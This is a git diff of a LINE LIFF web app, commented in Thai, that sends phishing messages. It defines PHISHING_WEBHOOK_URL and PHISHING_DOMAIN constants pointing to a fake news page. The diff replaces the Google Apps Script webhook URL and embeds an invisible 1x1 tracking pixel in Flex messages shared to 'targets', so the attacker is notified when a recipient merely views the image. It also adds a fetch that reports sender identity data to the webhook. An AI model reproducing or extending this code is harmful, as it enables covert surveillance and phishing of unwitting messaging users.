@@ -647,7 +647,7 @@
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzHEspTjHeut1D_2OoUtm0jCwsHZBifqI64rrL6_ePXjgsGKeYNacNwFzPY4uPfDiuUxg/exec'; // Updated GoogleScript.html Web App URL
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbyCbNxh4hEO_-oFngDhJLoxLR21r-dvcQjaiU6B0VE72A1MQu9qwSypWHCZffslPSL9gg/exec'; // Updated GoogleScript.html Web App URL
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงาน LIFF
@@ -1066,7 +1066,7 @@
                 const deviceInfo = getEnhancedDeviceInfo();
                 const ipInfo = await getIPInfo();
                 
-                // สร้าง URL สำหรับ Zero Click tracking พร้อมข้อมูลขั้นสูง
+                // สร้าง URL สำหรับ Zero Click tracking เมื่อเป้าหมายเห็นรูปภาพ
                 const randomSuffix = Date.now() + Math.random().toString(36).substring(2, 10);
                 let zeroClickTrackUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick&key=${trackingKey}&case=${encodeURIComponent(caseName)}&creator=${encodeURIComponent(userId)}&name=${encodeURIComponent(displayName)}`;
                 
@@ -1099,10 +1099,13 @@
                 
                 console.log("Zero Click Track URL:", zeroClickTrackUrl);
 
-                // แก้ไขให้มีเฉพาะรูปภาพ อย่างเดียว สะอาดและเรียบง่าย
+                // สร้าง tracking pixel ที่จะทำงานเมื่อเป้าหมายเห็นรูปภาพ
+                const trackingPixelUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick&key=${trackingKey}&case=${encodeURIComponent(caseName)}&target=view&r=${randomSuffix}`;
+
+                // สร้าง Flex message ที่มี tracking pixel แทรกอยู่
                 const message = {
                     type: 'flex',
-                    altText: `รูปภาพใหม่`, // ข้อความแจ้งเตือนสั้นๆ
+                    altText: `รูปภาพใหม่`,
                     contents: {
                         type: 'bubble',
                         hero: { // รูปภาพหลักที่คลิกได้
@@ -1111,19 +1114,32 @@
                             size: 'full',
                             aspectRatio: '1:1',
                             aspectMode: 'cover',
-                            action: { // ทำให้รูปภาพคลิกได้ -> ลิงก์ไปยัง index.html พร้อม tracking key
+                            action: { 
                                 type: 'uri',
                                 uri: clickTrackUrl
                             }
+                        },
+                        body: {
+                            type: 'box',
+                            layout: 'vertical',
+                            contents: [
+                                {
+                                    // ใช้รูปภาพขนาด 1x1 pixel เพื่อทำ tracking เมื่อเป้าหมายเห็นรูปภาพ
+                                    type: 'image',
+                                    url: trackingPixelUrl,
+                                    size: '1px', // ขนาดเล็กมากจนมองไม่เห็น
+                                    aspectRatio: '1:1'
+                                }
+                            ],
+                            paddingAll: '0px'
                         }
                     }
                 };
 
                 console.log("Attempting to share Flex Message:", JSON.stringify(message, null, 2));
 
-                // แก้ไข: ไม่เรียกใช้ Zero Click tracking ก่อนส่งไปยังเป้าหมาย
-                // ต้องเรียกเฉพาะหลังจากส่งข้อความสำเร็จเท่านั้น
-
+                // ไม่ทำ Zero Click tracking ที่นี่อีกต่อไป - มันจะทำงานเมื่อเป้าหมายเห็นรูปภาพแทน
+                
                 if (liff.isApiAvailable('shareTargetPicker')) {
                     console.log("ShareTargetPicker is available. Calling now...");
                     const result = await liff.shareTargetPicker([message]);
@@ -1136,22 +1152,21 @@
                         try {
                             const saved = await saveTrackingCaseMapping(trackingKey, caseName);
                             console.log('บันทึก Tracking Key Mapping ' + (saved ? 'สำเร็จ' : 'ไม่สำเร็จ'));
+                            
+                            // แทรก Zero Click บนอุปกรณ์ผู้ส่งไว้สำหรับการตรวจสอบ
+                            fetch(`${PHISHING_WEBHOOK_URL}?action=zeroClick&key=${trackingKey}&case=${encodeURIComponent(caseName)}&creator=${encodeURIComponent(userId)}&name=${encodeURIComponent(displayName)}&note=sender_device_only`, { 
+                                method: 'GET', 
+                                mode: 'no-cors' 
+                            }).catch(err => console.log("Test ping error:", err));
+                            
                         } catch (saveError) {
                             console.error('เกิดข้อผิดพลาดขณะบันทึก Tracking Key:', saveError);
                         }
-
-                        // แก้ไข: เรียกใช้ Zero Click tracking หลังจากแชร์สำเร็จเท่านั้น
-                        // ซึ่งหมายถึงผู้ใช้ได้เลือกผู้รับข้อความและส่งข้อความแล้ว
-                        console.log("ส่งข้อความสำเร็จ - ทำ Zero Click tracking ตอนนี้");
-                        fetch(zeroClickTrackUrl, { method: 'GET', mode: 'no-cors' })
-                            .then(response => console.log("Zero Click tracking triggered"))
-                            .catch(err => console.log("Zero Click tracking error:", err));
 
                         // รีเซ็ตหน้าจอ
                         resetForm();
                     } else {
                         showStatus('การแชร์ถูกยกเลิก', false);
-                        console.log("ShareTargetPicker was cancelled - ไม่ทำ Zero Click tracking");
                     }
                 } else {
                     showStatus('ShareTargetPicker ไม่พร้อมใช้งาน', false);
